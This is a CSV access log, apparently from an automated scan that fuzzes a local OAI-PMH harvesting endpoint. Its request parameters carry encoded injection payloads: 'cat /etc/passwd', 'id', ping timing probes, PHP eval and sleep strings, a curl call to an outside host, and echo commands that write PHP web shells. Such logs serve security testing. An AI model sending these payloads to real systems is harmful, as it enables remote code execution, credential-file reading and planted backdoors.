uuid,timestamp,http_status_code,request_url,response_time,http_version
4544c034-0941-4e0e-a48f-0320e98777ce,2024-12-31 00:38:38,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2126.74 ms,HTTP/1.1
08826f7f-3fc7-46bc-a5fe-95c3141d4422,2024-12-31 00:38:41,200,http://localhost:8081/oai/request?verb=ListSets,2083.54 ms,HTTP/1.1
f9f4e239-af48-4c4a-b676-b210223eb2f3,2024-12-31 00:38:43,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%250Acat%2520%2Fetc%2Fpasswd&until=%250Acat%2520%2Fetc%2Fpasswd&set=%250Acat%2520%2Fetc%2Fpasswd,2106.01 ms,HTTP/1.1
06d166b2-39c7-4697-aaef-c72964535104,2024-12-31 00:38:45,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc,2087.77 ms,HTTP/1.1
3d38373a-d788-47d3-a628-06f92dfc6bd1,2024-12-31 00:38:48,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%250Acat%2520%2Fetc%2Fpasswd&metadataPrefix=oai_dc,2134.22 ms,HTTP/1.1
2eca863d-45fc-4893-b723-6978735d47d2,2024-12-31 00:38:50,403,http://localhost:8081/oai/request?verb=%250Aid,2058.90 ms,HTTP/1.1
6c762f52-97c0-4a45-9cf1-c57a2304ba6e,2024-12-31 00:38:52,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2058.03 ms,HTTP/1.1
7ee8d059-9510-4bce-8ea0-fa82e032c81f,2024-12-31 00:38:54,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%250Aid,2069.82 ms,HTTP/1.1
e8089757-56b9-417c-9c46-39d5df8bf8e5,2024-12-31 00:38:57,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%250Aid,2102.74 ms,HTTP/1.1
0fb3c6a5-a5ba-43d9-b881-ebe706b3f9b7,2024-12-31 00:38:59,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&from=%250Aid&until=%250Aid&set=%250Aid,2066.02 ms,HTTP/1.1
e05a8485-5f76-43fb-b551-92150febdd02,2024-12-31 00:39:01,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%250Aid&metadataPrefix=marc,2056.77 ms,HTTP/1.1
f7b88d2f-fdec-4117-a8a4-2aa7ad4e874b,2024-12-31 00:39:03,403,http://localhost:8081/oai/request?verb=%250Aid%250A,2052.05 ms,HTTP/1.1
6bf1f868-2101-4093-973b-63ab463558a7,2024-12-31 00:39:06,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2076.73 ms,HTTP/1.1
85070c8d-47d5-4544-ac82-6ec9d0102bbf,2024-12-31 00:39:08,200,http://localhost:8081/oai/request?verb=ListSets,2086.22 ms,HTTP/1.1
03dddc3e-ecf9-4b58-a209-4544f85ff342,2024-12-31 00:39:10,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%250Aid%250A,2058.69 ms,HTTP/1.1
23b69d0e-08ea-4c8a-a8a3-02e3653a7f40,2024-12-31 00:39:13,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc,2829.18 ms,HTTP/1.1
8f336bf4-18d9-4354-9740-e4ef133bf947,2024-12-31 00:39:16,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%250Aid%250A&metadataPrefix=marc,2052.32 ms,HTTP/1.1
9b23e4ec-3fe8-4d35-aff8-6e682522aabe,2024-12-31 00:39:18,403,http://localhost:8081/oai/request?verb=%250a,2048.02 ms,HTTP/1.1
c1d80ee6-60df-4491-b396-169846043367,2024-12-31 00:39:20,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2070.18 ms,HTTP/1.1
97811370-5f6b-4a5e-9f53-0280d8590df6,2024-12-31 00:39:22,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%250a,2067.30 ms,HTTP/1.1
d2d8650d-ab30-4237-88e2-e4423a1afa2b,2024-12-31 00:39:25,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%250a&set=%250a,2067.42 ms,HTTP/1.1
d56d186e-9d01-48a5-8e6d-cbbfcc3fe809,2024-12-31 00:39:27,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&set=%250a,2042.08 ms,HTTP/1.1
6c73730f-a19f-4abe-a5ec-e6e940392c61,2024-12-31 00:39:29,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%250a&metadataPrefix=marc,2057.84 ms,HTTP/1.1
90a81fbd-e256-490d-8790-4c38a1ce8610,2024-12-31 00:39:32,403,http://localhost:8081/oai/request?verb=%250a+id+%250a,2029.40 ms,HTTP/1.1
c3315271-ef55-44ee-bfe9-9bf2450f532f,2024-12-31 00:39:34,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%250a+id+%250a,2054.57 ms,HTTP/1.1
dddc7cbc-4d3d-4cde-846c-9fce5d14b880,2024-12-31 00:39:36,200,http://localhost:8081/oai/request?verb=ListSets,2057.73 ms,HTTP/1.1
13b5b586-6d96-4abe-9d3e-3095ad7698d7,2024-12-31 00:39:38,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc,2047.47 ms,HTTP/1.1
fdf23c86-b85d-40c8-9946-51dbca2e54d1,2024-12-31 00:39:41,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%250a+id+%250a&set=%250a+id+%250a,2069.09 ms,HTTP/1.1
555799cf-fb89-4e97-8f23-96e749ff7b7f,2024-12-31 00:39:43,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%250a+id+%250a&metadataPrefix=marc,2051.78 ms,HTTP/1.1
46916f60-62e3-4654-aaaf-5ad4b4679fcc,2024-12-31 00:39:45,403,http://localhost:8081/oai/request?verb=%250a+ping+-i+30+127.0.0.1+%250a,2063.38 ms,HTTP/1.1
efd7ee1a-28f9-42c9-b441-7f7784f61547,2024-12-31 00:39:47,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%250a+ping+-i+30+127.0.0.1+%250a,2075.86 ms,HTTP/1.1
c96693d0-e29e-4c7c-b794-d139d4c62381,2024-12-31 00:39:50,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%250a+ping+-i+30+127.0.0.1+%250a,2043.13 ms,HTTP/1.1
87a56aef-7f4f-4181-9e55-884f87c31244,2024-12-31 00:39:52,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%250a+ping+-i+30+127.0.0.1+%250a&set=%250a+ping+-i+30+127.0.0.1+%250a,2073.60 ms,HTTP/1.1
8f75075a-75ee-4a93-8daf-61d5abf56f9f,2024-12-31 00:39:54,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&until=%250a+ping+-i+30+127.0.0.1+%250a&set=%250a+ping+-i+30+127.0.0.1+%250a,2080.66 ms,HTTP/1.1
d1572f0a-7460-46de-9696-9eec6fe7c32a,2024-12-31 00:39:57,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%250a+ping+-i+30+127.0.0.1+%250a&metadataPrefix=oai_dc,2127.89 ms,HTTP/1.1
a38a29b4-703a-4ab3-9f39-1a30671ca419,2024-12-31 00:39:59,403,http://localhost:8081/oai/request?verb=%250a%250d,2060.68 ms,HTTP/1.1
9d7c599e-5746-43dc-b2f9-4093288df313,2024-12-31 00:40:01,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2084.43 ms,HTTP/1.1
54e08735-4ce4-4d77-8d41-4dfeaf460dda,2024-12-31 00:40:04,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%250a%250d,2074.87 ms,HTTP/1.1
0c939e4c-dce9-4e0c-a657-6ede6f9b8dc4,2024-12-31 00:40:06,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%250a%250d&set=%250a%250d,2056.33 ms,HTTP/1.1
116c1649-5fa1-4109-aa94-4c8bfa51ab1d,2024-12-31 00:40:08,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc,2497.33 ms,HTTP/1.1
0f7d3e71-0826-4302-b185-2058777fdfb6,2024-12-31 00:40:11,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%250a%250d&metadataPrefix=oai_dc,2110.90 ms,HTTP/1.1
d52e0137-b40f-48f0-8df9-1ac99081111c,2024-12-31 00:40:13,403,http://localhost:8081/oai/request?verb=%252+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%27+%7Cping+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%5C%22+%7Cping+-n+21+127.0.0.1,2045.37 ms,HTTP/1.1
3dc0c4fb-a659-449f-8e47-a1691a21c13f,2024-12-31 00:40:15,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2075.94 ms,HTTP/1.1
3fd7c7d8-4d02-4ec1-974a-8aba77b0f96a,2024-12-31 00:40:18,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%252+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%27+%7Cping+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%5C%22+%7Cping+-n+21+127.0.0.1,2083.82 ms,HTTP/1.1
cec72540-98ce-41be-a1b2-22007451751f,2024-12-31 00:40:20,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%252+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%27+%7Cping+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%5C%22+%7Cping+-n+21+127.0.0.1&until=%252+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%27+%7Cping+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%5C%22+%7Cping+-n+21+127.0.0.1&set=%252+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%27+%7Cping+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%5C%22+%7Cping+-n+21+127.0.0.1,2043.60 ms,HTTP/1.1
6af05bb5-89dd-476c-a9c7-f3273faf6b50,2024-12-31 00:40:22,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&set=%252+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%27+%7Cping+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%5C%22+%7Cping+-n+21+127.0.0.1,2082.00 ms,HTTP/1.1
0a449f15-78f1-4580-99a9-596e629ce374,2024-12-31 00:40:24,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%252+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%27+%7Cping+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%5C%22+%7Cping+-n+21+127.0.0.1&metadataPrefix=marc,2067.05 ms,HTTP/1.1
929d30c0-57a2-4d98-a5ab-2fd80abdc829,2024-12-31 00:40:27,403,http://localhost:8081/oai/request?verb=%2520%7B%24%7Bphpinfo%28%29%7D%7D,2057.51 ms,HTTP/1.1
c802327e-f72e-4aad-ac33-12b5f3dd8b1e,2024-12-31 00:40:29,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%2520%7B%24%7Bphpinfo%28%29%7D%7D,2074.15 ms,HTTP/1.1
cb966992-5440-4256-b11e-5cffa6ed7e29,2024-12-31 00:40:31,200,http://localhost:8081/oai/request?verb=ListSets,2048.62 ms,HTTP/1.1
61c1261e-72c1-43cf-81fa-934ad8375aac,2024-12-31 00:40:33,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%2520%7B%24%7Bphpinfo%28%29%7D%7D&until=%2520%7B%24%7Bphpinfo%28%29%7D%7D,2047.44 ms,HTTP/1.1
a31c7a0c-40fd-47d2-bd41-eb88789ba1c9,2024-12-31 00:40:36,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%2520%7B%24%7Bphpinfo%28%29%7D%7D,2099.40 ms,HTTP/1.1
89d357ea-9075-49da-b2ff-84a6bf3daf09,2024-12-31 00:40:38,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%2520%7B%24%7Bphpinfo%28%29%7D%7D&metadataPrefix=marc,2082.15 ms,HTTP/1.1
ade6914a-b982-417d-b3f6-2729e9410c20,2024-12-31 00:40:40,403,http://localhost:8081/oai/request?verb=%2520%7B%24%7Bsleep%2820%29%7D%7D,2047.38 ms,HTTP/1.1
e1995d90-ff68-42d8-bab7-2664489e0aef,2024-12-31 00:40:43,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%2520%7B%24%7Bsleep%2820%29%7D%7D,2109.87 ms,HTTP/1.1
d5c56d51-862d-4548-b6a2-c79a702b78fa,2024-12-31 00:40:45,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%2520%7B%24%7Bsleep%2820%29%7D%7D,2084.52 ms,HTTP/1.1
825cff0a-3a31-4009-85dc-5f6ade8067ab,2024-12-31 00:40:47,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&set=%2520%7B%24%7Bsleep%2820%29%7D%7D,2066.17 ms,HTTP/1.1
7f174096-50f9-447e-89d8-fdcf7a6407b5,2024-12-31 00:40:50,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc,2492.09 ms,HTTP/1.1
0677f01c-5608-47fb-8eac-ab32c11076a9,2024-12-31 00:40:52,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%2520%7B%24%7Bsleep%2820%29%7D%7D&metadataPrefix=marc,2108.84 ms,HTTP/1.1
a2610600-64ea-493c-b006-414550e1f1a3,2024-12-31 00:40:54,403,http://localhost:8081/oai/request?verb=%2520%7B%24%7Bsleep%283%29%7D%7D,2054.80 ms,HTTP/1.1
a37881aa-2a5b-4d5b-8fc3-61ac39f0fd20,2024-12-31 00:40:57,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2072.36 ms,HTTP/1.1
5a6a47ba-d490-49a8-b655-8b843d2c97c7,2024-12-31 00:40:59,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%2520%7B%24%7Bsleep%283%29%7D%7D,2076.94 ms,HTTP/1.1
cf25730c-9b4f-4b71-a871-3341bd0d2474,2024-12-31 00:41:01,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%2520%7B%24%7Bsleep%283%29%7D%7D&until=%2520%7B%24%7Bsleep%283%29%7D%7D,2089.95 ms,HTTP/1.1
2d78e640-1fed-4348-8d15-700892efa4ea,2024-12-31 00:41:03,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&from=%2520%7B%24%7Bsleep%283%29%7D%7D&until=%2520%7B%24%7Bsleep%283%29%7D%7D,2067.87 ms,HTTP/1.1
53f8f648-d46a-4761-b5e4-b9201f2c7db6,2024-12-31 00:41:06,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%2520%7B%24%7Bsleep%283%29%7D%7D&metadataPrefix=oai_dc,2179.38 ms,HTTP/1.1
999a2e63-1f83-4d7b-aaad-65e5c2071359,2024-12-31 00:41:08,403,http://localhost:8081/oai/request?verb=%26,2064.56 ms,HTTP/1.1
26a74895-bc3d-4037-b2a7-c1f3ee88c649,2024-12-31 00:41:10,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2041.49 ms,HTTP/1.1
e53773bb-e6a9-4dcc-a7d0-717051c877e8,2024-12-31 00:41:13,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%26,2062.40 ms,HTTP/1.1
45615ee8-0f1d-46fc-8ab2-1a683bf00214,2024-12-31 00:41:15,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%26&set=%26,2060.27 ms,HTTP/1.1
6367e055-7642-4d11-b2a4-c311badbe326,2024-12-31 00:41:17,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%26,2059.08 ms,HTTP/1.1
c2a5c8f8-7ca1-4b3c-a67f-cd226bdb310c,2024-12-31 00:41:22,403,http://localhost:8081/oai/request?verb=%26+curl+http%3A%2F%2Fcrowdshield.com%2F.testing%2Frce.txt,2038.43 ms,HTTP/1.1
e89fda3d-5c84-4b47-8f4f-cc4407d08739,2024-12-31 00:41:24,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%26+curl+http%3A%2F%2Fcrowdshield.com%2F.testing%2Frce.txt,2077.47 ms,HTTP/1.1
2746b832-fe0e-4251-a5e1-536bc9038c3d,2024-12-31 00:41:26,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%26+curl+http%3A%2F%2Fcrowdshield.com%2F.testing%2Frce.txt,2033.60 ms,HTTP/1.1
b464b5ad-4052-4b0b-b2b0-0542676d0a81,2024-12-31 00:41:28,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&set=%26+curl+http%3A%2F%2Fcrowdshield.com%2F.testing%2Frce.txt,2053.81 ms,HTTP/1.1
e1087012-a30e-44d9-b6d6-53ba8394b3b1,2024-12-31 00:41:31,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&from=%26+curl+http%3A%2F%2Fcrowdshield.com%2F.testing%2Frce.txt&set=%26+curl+http%3A%2F%2Fcrowdshield.com%2F.testing%2Frce.txt,2070.11 ms,HTTP/1.1
124bfeff-e71d-4256-85f5-64a734af3f34,2024-12-31 00:41:33,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%26+curl+http%3A%2F%2Fcrowdshield.com%2F.testing%2Frce.txt&metadataPrefix=marc,2057.28 ms,HTTP/1.1
73c48fa7-3ee1-439e-91a4-daa5c8c5ff1f,2024-12-31 00:41:35,403,http://localhost:8081/oai/request?verb=%26+dir,2111.45 ms,HTTP/1.1
c7d7c96c-b7a6-48bc-8c24-e345e30b752b,2024-12-31 00:41:38,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%26+dir,2073.16 ms,HTTP/1.1
75b4b731-801e-4740-bf20-152636439426,2024-12-31 00:41:40,200,http://localhost:8081/oai/request?verb=ListSets,2051.21 ms,HTTP/1.1
f7f6e8de-396d-440f-a3c4-bd0b73ef725a,2024-12-31 00:41:42,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%26+dir&until=%26+dir&set=%26+dir,2058.68 ms,HTTP/1.1
c9bd5cf5-28ed-4ac2-b043-cdec8ba4576a,2024-12-31 00:41:44,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&from=%26+dir&until=%26+dir,2074.50 ms,HTTP/1.1
f73d67eb-5fd3-4fc4-8397-5019e4aa8173,2024-12-31 00:41:47,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%26+dir&metadataPrefix=oai_dc,2094.40 ms,HTTP/1.1
f74bf04d-a61f-4ae0-8da5-9a95999648ef,2024-12-31 00:41:49,403,http://localhost:8081/oai/request?verb=%26+dir+C%3A%5C,2060.11 ms,HTTP/1.1
1f45953f-eaef-45f6-b8c7-27fe7012cdbe,2024-12-31 00:41:51,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%26+dir+C%3A%5C,2040.91 ms,HTTP/1.1
6a912ec9-3e4d-49e3-9b95-249d411033d8,2024-12-31 00:41:53,200,http://localhost:8081/oai/request?verb=ListSets,2089.17 ms,HTTP/1.1
cf23ae5a-5e24-47e1-8608-f367dcadfe52,2024-12-31 00:41:56,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%26+dir+C%3A%5C,2058.26 ms,HTTP/1.1
79a5fbb8-4925-4a3d-8535-f54fd9f9230f,2024-12-31 00:41:58,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%26+dir+C%3A%5C&set=%26+dir+C%3A%5C,2071.18 ms,HTTP/1.1
94ba81cf-9a4e-48d2-b144-b00208356dde,2024-12-31 00:42:03,403,http://localhost:8081/oai/request?verb=%26+dir+C%3A%5CDocuments+and+Settings%5C%2A,2039.92 ms,HTTP/1.1
77830208-3c32-452a-80ba-821bf175ea41,2024-12-31 00:42:05,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2105.80 ms,HTTP/1.1
a4dc2b09-ebc5-4f33-8e60-ccbb34b5e7a7,2024-12-31 00:42:07,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%26+dir+C%3A%5CDocuments+and+Settings%5C%2A,2077.77 ms,HTTP/1.1
35c3d468-7812-43cc-b8fc-d5bbcf2846d2,2024-12-31 00:42:09,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%26+dir+C%3A%5CDocuments+and+Settings%5C%2A,2094.98 ms,HTTP/1.1
cc9fb2bb-6d9b-4500-afee-33915a4aed18,2024-12-31 00:42:12,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%26+dir+C%3A%5CDocuments+and+Settings%5C%2A&until=%26+dir+C%3A%5CDocuments+and+Settings%5C%2A,2054.71 ms,HTTP/1.1
b741a3d4-f024-428a-8ce8-e47f9dbf6a54,2024-12-31 00:42:16,403,http://localhost:8081/oai/request?verb=%26+dir+C%3A%5CUsers,2072.31 ms,HTTP/1.1
2bc284ad-2e7a-46f0-b78f-6943d472aaef,2024-12-31 00:42:19,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2059.09 ms,HTTP/1.1
d8f8cedb-dabe-4b21-8626-b07a9f2fb032,2024-12-31 00:42:21,200,http://localhost:8081/oai/request?verb=ListSets,2067.42 ms,HTTP/1.1
29735913-7fc9-4025-afb0-3822c1cc5d20,2024-12-31 00:42:23,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%26+dir+C%3A%5CUsers&set=%26+dir+C%3A%5CUsers,2080.49 ms,HTTP/1.1
fed17d1b-e2a9-423b-93fc-afc04b8c27f9,2024-12-31 00:42:25,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&from=%26+dir+C%3A%5CUsers&until=%26+dir+C%3A%5CUsers&set=%26+dir+C%3A%5CUsers,2048.70 ms,HTTP/1.1
e6fe2e14-bf29-4c5f-82b7-9de9316d9f0b,2024-12-31 00:42:30,403,http://localhost:8081/oai/request?verb=%26+echo+%22%3C%3Fphp+include%28%24_GET%5B%27page%27%5D%29%3B+%3F%3E%22+%3E+rfi.php,2034.20 ms,HTTP/1.1
08ac2b93-d429-4b78-81c0-7730237f6169,2024-12-31 00:42:32,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2064.28 ms,HTTP/1.1
12a5fa49-682b-4014-867a-32049286f398,2024-12-31 00:42:34,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%26+echo+%22%3C%3Fphp+include%28%24_GET%5B%27page%27%5D%29%3B+%3F%3E%22+%3E+rfi.php,2084.43 ms,HTTP/1.1
16e8992b-f431-4a58-82b5-6d94e2de12bd,2024-12-31 00:42:37,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%26+echo+%22%3C%3Fphp+include%28%24_GET%5B%27page%27%5D%29%3B+%3F%3E%22+%3E+rfi.php&set=%26+echo+%22%3C%3Fphp+include%28%24_GET%5B%27page%27%5D%29%3B+%3F%3E%22+%3E+rfi.php,2079.56 ms,HTTP/1.1
5184fcb4-b121-4f8d-bc49-2c4589fd4213,2024-12-31 00:42:39,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc,2512.98 ms,HTTP/1.1
5fc3847c-4d2f-4bf7-95ad-2da24804156d,2024-12-31 00:42:42,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%26+echo+%22%3C%3Fphp+include%28%24_GET%5B%27page%27%5D%29%3B+%3F%3E%22+%3E+rfi.php&metadataPrefix=oai_dc,2108.44 ms,HTTP/1.1
6b278f09-08f8-4eda-b278-8f3307729a86,2024-12-31 00:42:44,403,http://localhost:8081/oai/request?verb=%26+echo+%22%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E%22+%3E+cmd.php,2044.26 ms,HTTP/1.1
519313bd-34db-4d8f-a80b-b361fc4ec990,2024-12-31 00:42:46,403,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%26+echo+%22%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E%22+%3E+cmd.php,2058.19 ms,HTTP/1.1
238ee202-5f3c-4baa-8eda-4682e97c8cfc,2024-12-31 00:42:49,403,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%26+echo+%22%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E%22+%3E+cmd.php,2042.96 ms,HTTP/1.1
614a8b4a-d363-4aed-a593-42d0c34f103f,2024-12-31 00:42:51,403,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%26+echo+%22%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E%22+%3E+cmd.php&set=%26+echo+%22%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E%22+%3E+cmd.php,2037.46 ms,HTTP/1.1
922fd04b-f29b-43dd-a59c-c54094947703,2024-12-31 00:42:53,403,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&from=%26+echo+%22%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E%22+%3E+cmd.php&set=%26+echo+%22%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E%22+%3E+cmd.php,2041.42 ms,HTTP/1.1
0de1b0eb-b347-4170-8900-2d26c3ae93d7,2024-12-31 00:42:55,403,http://localhost:8081/oai/request?verb=GetRecord&identifier=%26+echo+%22%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E%22+%3E+cmd.php&metadataPrefix=marc,2106.05 ms,HTTP/1.1
dd4e5749-de30-45bc-9c72-b34075592cfa,2024-12-31 00:42:58,403,http://localhost:8081/oai/request?verb=%26+echo+%22%3C%3Fphp+system%28%27dir+%24_GET%5B%27dir%27%5D%27%29%3B+%3F%3E%22+%3E+dir.php,2083.53 ms,HTTP/1.1
43dc7170-a452-4f62-99d7-ee3283aa0dbc,2024-12-31 00:43:00,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2058.96 ms,HTTP/1.1
4926fc7b-d3e2-443e-be39-1289391f6d9e,2024-12-31 00:43:02,403,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%26+echo+%22%3C%3Fphp+system%28%27dir+%24_GET%5B%27dir%27%5D%27%29%3B+%3F%3E%22+%3E+dir.php,2041.78 ms,HTTP/1.1
088c4651-f13a-4e8c-b7db-ce24bdf95d57,2024-12-31 00:43:05,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc,2292.42 ms,HTTP/1.1
